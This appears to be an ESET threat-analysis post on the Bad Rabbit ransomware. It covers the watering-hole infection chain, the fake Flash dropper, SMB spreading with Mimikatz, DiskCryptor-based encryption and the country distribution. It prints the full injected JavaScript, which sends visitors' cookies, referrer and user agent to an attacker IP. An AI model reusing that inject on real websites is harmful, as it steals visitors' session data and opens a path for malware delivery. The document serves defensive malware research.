A new ransomware outbreak today has hit some major infrastructure in Ukraine including Kiev metro. Here are some
details about this new variant of Petya.
UPDATE (October 27 – 15:35 CEST): A new report suggested that EternalRomance – one of the leaked NSA tools – has
been used to spread Diskcoder.D in the network. We were able to confirm this by installing the out-of-life-cycle patch
MS17-010 (a patch addressing vulnerabilities misused by the leaked NSA exploits), which stopped the further spread of
the malware via IPC share.

A new ransomware outbreak today and has hit some major infrastructure in Ukraine including Kiev metro. Here are some
of the details about this new variant.

Drive-by download via watering hole on popular sites
One of the distribution method of Bad Rabbit is via drive-by download. Some popular websites are compromised and have
JavaScript injected in their HTML body or in one of their .js files.

Here is a beautified version of the inject:
JavaScript

function e(d) {

2

var xhr = null;

3

if (!!window.XMLHttpRequest) {

4

xhr = new XMLHttpRequest();

5

} else if (!!window.ActiveXObject) {

6

var xhrs = ['Microsoft.XMLHTTP', 'Msxml2.XMLHTTP', 'Msxml2.XMLHTTP.3.0', 'Msxml2.XMLHTTP.6.0'];

7

for (var i = 0; i < xhrs.length; i++) {

8

try {

xhr = ActiveXObject(xhrs[i]);

10

break;

11

} catch (e) {}

12

}

13

}

14

if (!!xhr) {

15

xhr.open('POST', 'http://185.149.120\.3/scholargoogle/');

16

xhr.timeout = 10000;

17

xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

18

xhr.onreadystatechange = function() {

19

if (xhr.readyState == 4 && xhr.status == 200) {

20

var resp = xhr.responseText;

21

if (resp) {

22

var fans = JSON.parse(resp);

23

if (fans) {

24

var an_s = decodeURIComponent(fans.InjectionString).replace(/\+/g, '%20');

25

var da = document.createElement('div');

26

da.id = 'ans';

27

da.innerHTML = an_s;

28

document.body.appendChild(da);

29

}

30

}

31

}

32

};

33

var pd = [];

34

for (var k in d) {

35

if (d.hasOwnProperty(k)) {

36

pd.push(k + '=' + d[k]);

37

}

38

}

39

var dc = pd.join('&');

40

xhr.send(dc);

41

}

42

}

43

e({

44

'agent': navigator.userAgent,

'referer': document.referrer,

46

'cookie': document.cookie,

'domain': window.location.hostname,

});

This script reports the following to 185.149.120[.]3, which doesn’t seem to respond at the moment.
Browser User-Agent
Referrer
Cookie from the visited site
Domain name of the visited site
Server side logic can determine if the visitor is of interest and then add content to the page. In that case, what we have
seen is that a popup asking to download an update for Flash Player is shown in the middle of the page.

When clicking on the “Install” button, download of an executable file from 1dnscontrol[.]com is initiated. This executable
file, install_flash_player.exe is the dropper for Win32/Diskcoder.D.
Finally the computer is locked and the malware shows the ransom note:

The payment page:

Spreading via SMB

5/9

Win32/Diskcoder.D has the ability to spread via SMB. As opposed to some public claims, it does not use the EternalBlue
vulnerability like the Win32/Diskcoder.C (Not-Petya) outbreak. First, it scans internal networks for open SMB shares. It
looks for the following shares:
admin
atsvc
browser
eventlog
lsarpc
netlogon
ntsvcs
spoolss
samr
srvsvc
scerpc
svcctl
wkssvc
Mimikatz is launched on the compromised computer to harvest credentials. A hardcoded list of usernames and passwords
is also present.

When working credentials are found, the infpub.dat file is dropped into the Windows directory and executed through
SCManager and rundll.exe.

Encryption

7/9

Win32/Diskcoder.D is modified version of Win32/Diskcoder.C. Bugs in file encryption were fixed. The encryption now uses
DiskCryptor, an open source legitimate software used to do full drive encryption. Keys are generated using
CryptGenRandom and then protected by a hardcoded RSA 2048 public key.
Like before, AES-128-CBC is used.

Distribution
Interestingly, ESET telemetry shows that Ukraine accounts only for 12.2% of the total number of times we have seen the
dropper component Here are the statistics:
Russia: 65%
Ukraine: 12.2%
Bulgaria: 10.2%
Turkey: 6.4%
Japan: 3.8%
Other: 2.4%
This pretty much matches the distribution of compromised websites that include the malicious JavaScript. So why does
Ukraine seem to be more hit than the rest?
It’s interesting to note that all these big companies were all hit at the same time. It is possible that the group already had a
foot inside their network and launched the watering hole attack at the same time as a decoy. Nothing says they fell for the
“Flash update”. ESET is still investigating and we will post our finding as we discover them.
